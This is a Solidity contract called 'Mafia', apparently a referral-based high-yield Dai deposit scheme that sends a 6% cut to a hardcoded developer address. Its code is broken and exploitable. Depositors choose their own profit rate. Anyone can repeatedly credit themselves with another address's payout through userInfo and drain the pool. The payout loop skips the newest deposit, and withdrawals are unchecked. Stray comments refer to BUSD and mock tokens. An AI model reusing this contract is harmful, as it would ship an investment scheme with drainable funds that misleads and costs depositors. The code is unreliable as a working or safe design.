pragma solidity >=0.5.0;

import "./DaiToken.sol";



contract Mafia {

    DaiToken public daiToken;
    uint public depositsCount = 0;
    uint256 public commission = 5;
    uint public PERCENT_DIVIDER = 100;
    address public dev = 0xd7506cf280aC25E2F265d45D3C6c00ed95d9A3d9;
    address public owner;
    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    

    address[] public stakers;
    mapping(address => uint) public Balance;
    mapping(address => uint) public TotalInvest;
    mapping(address => uint) public TotalInvestCount;
    mapping(address => uint) public TotalWithdrawal;
    mapping(address => uint) public TotalCommission;
    mapping(address => bool) public hasStaked;
    mapping(address => bool) public isStaking;
    mapping(address => address) public Upline;
    mapping(address => uint) public dividends;
    mapping(address => uint40) public last_payout;
    mapping(uint => Deposit) public deposits;

    struct Deposit {
    uint id;   
    address payable owner;
    uint8 profit;
    uint8 life_days;
    uint256 amount;
    uint40 time;
    }

    constructor(DaiToken _daiToken) public {
        daiToken = _daiToken;
        owner = msg.sender;

    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            last_payout[_addr] = uint40(block.timestamp);
            Balance[_addr] += payout;
        }
    }

    function deposit(uint256 _amount, uint8 profit, uint8 life_days, address _upline) public {
        

        uint256 dev_mar_commisison = _amount * 6 / PERCENT_DIVIDER;
        uint256 original_amount = _amount * 94 / PERCENT_DIVIDER;
        
        daiToken.transferFrom(msg.sender, address(this), original_amount);   // Transfer BUSD from User to Vult
        daiToken.transfer(dev, dev_mar_commisison);
        
        // Add user to stakers array *only* if they haven't staked already
        if(!hasStaked[msg.sender]) {
            stakers.push(msg.sender);
        }

        // Update staking status
        isStaking[msg.sender] = true;
        hasStaked[msg.sender] = true;

        TotalInvest[msg.sender] = TotalInvest[msg.sender] + original_amount; // Update staking balance
        //Balance[msg.sender] = Balance[msg.sender] + original_amount;


        // Affiliate section
        uint256 bonus = original_amount * commission / PERCENT_DIVIDER;
        TotalCommission[_upline] = TotalCommission[_upline] + bonus;
        Balance[_upline] = Balance[_upline] + bonus;
        match_bonus += bonus;
        // end aff sec
        TotalInvestCount[msg.sender] ++;
        invested += original_amount; //Add to Total 


        depositsCount ++;
        // add plan
        deposits[depositsCount] = Deposit(depositsCount, msg.sender, profit, life_days, original_amount, uint40(block.timestamp));

 
    }
    
    function withdraw() external {
        
        _payout(msg.sender);

        uint balance = Balance[msg.sender]; // Fetch staking balance
        
        
        
        daiToken.transfer(msg.sender, balance); // Transfer Mock Dai tokens to this contract for staking

        // Reset staking balance
        Balance[msg.sender] = 0;
        TotalWithdrawal[msg.sender] = TotalWithdrawal[msg.sender] + balance;

        withdrawn += balance; //Add to total
        
        isStaking[msg.sender] = false; // Update staking status
    } 

    
    function payoutOf(address _addr) view external returns(uint256 value) {
        

        for(uint256 i=0; i < depositsCount ; i++) {
            if(_addr == deposits[i].owner){


            uint40 time_end = deposits[i].time + deposits[i].life_days * 86400;
            uint40 from = last_payout[_addr] > deposits[i].time ? last_payout[_addr] : deposits[i].time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += deposits[i].amount * (to - from) * deposits[i].profit / deposits[i].life_days / 8640000;
            }
        }
        }
        return value;
    }



    function userInfo(address _addr) external {

        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            last_payout[msg.sender] = uint40(block.timestamp);
            Balance[msg.sender] += payout;
        }



    }








}